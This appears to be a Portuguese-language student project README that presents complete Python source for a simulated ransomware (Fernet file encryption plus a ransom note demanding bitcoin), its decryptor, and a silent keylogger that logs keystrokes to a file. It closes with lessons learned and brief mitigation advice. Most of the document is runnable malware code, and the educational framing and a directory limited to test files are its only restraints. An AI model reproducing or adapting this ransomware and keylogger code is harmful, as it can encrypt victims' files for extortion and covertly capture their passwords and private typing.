# Projeto DIO — Malware Simulado com Python (Ransomware e Keylogger)

**Autor:** Vitoria Gouveia
**Data:** 18/10/2025

---

## Resumo

Este repositório documenta dois projetos práticos desenvolvidos em ambiente controlado e com fins exclusivamente educacionais. O objetivo é compreender, experimentar e registrar como funcionam dois tipos comuns de malware:

Ransomware Simulado: criptografia de arquivos, geração de chave e mensagem de resgate.

Keylogger Simulado: captura de teclas e registro das entradas em arquivo de texto.

Esses experimentos permitiram entender como malwares sequestram dados, rastreiam digitação, e principalmente como podemos nos defender deles na vida real.

---

## 1) Ransomware Simulado
**Ambiente e preparação**

Criei um diretório de testes (test_files/) contendo arquivos fictícios para simular documentos reais.

**O ransomware foi desenvolvido em Python utilizando as bibliotecas:**

cryptography.fernet para criptografia e descriptografia

os.walk() para varrer arquivos

Código completo para o processo de criptografia e mensagem de resgate — ransomware.py
```bash
from cryptography.fernet import Fernet
import os

#1 Gerar uma chave de criptografia e salvar
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

#2 Carregar a chave salva:
def carregar_chave():
    return open("chave.key", "rb").read()

#3 Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

#4 Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

#5 Mensagem de resgate
def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envie 1 bitcoin para o endereço X e envie o comprovante!\n")
        f.write("Depois disso, enviaremos a chave para você recuperar seus dados")

#6 Execução principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransoware executado! Arquivos criptografados!")

if __name__=="__main__":
    main()
```

Código completo para a descriptografia — decrypt.py
```bash
from cryptography.fernet import Fernet
import os

def carregar_chave():
    return open("chave.key", "rb").read()

def descriptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
        dados_descriptografados = f.decrypt(dados)
        with open(arquivo, "wb") as file:
            file.write(dados_descriptografados)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

def main():
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        descriptografar_arquivo(arquivo, chave)
    print("Arquivos restaurados com sucesso")

if __name__ == "__main__":
    main()
```

---

## 2) Keylogger Simulado

Este foi o segundo projeto, com o propósito de entender como keyloggers capturam entradas do teclado. O script faz a captura silenciosa das teclas utilizando a biblioteca pynput e registra tudo em log.txt.

O código também ignora teclas especiais como Shift, Ctrl e Alt, e trata especificamente espaço, enter, tab, backspace e ESC.

Código completo — keylogger.py
```bash
from pynput import keyboard

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key):
    try: 
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)

    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}] ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

---

## O que aprendi

* Como funciona um ransomware real (criptografia, chave simétrica, arquivos travados).
* Criar scripts reversíveis (criptografar e descriptografar).
* Capturar eventos de teclado em baixo nível com pynput.
* Como malwares exploram comportamento humano e brechas simples.

---

## Recomendações de mitigação

* Uso de antivírus atualizado, firewall e bloqueio de tráfego suspeito, sandbox para testar arquivos suspeitos, não executar anexos desconhecidos.
* Práticas gerais de segurança: senhas fortes, backups, e consciência do usuário.
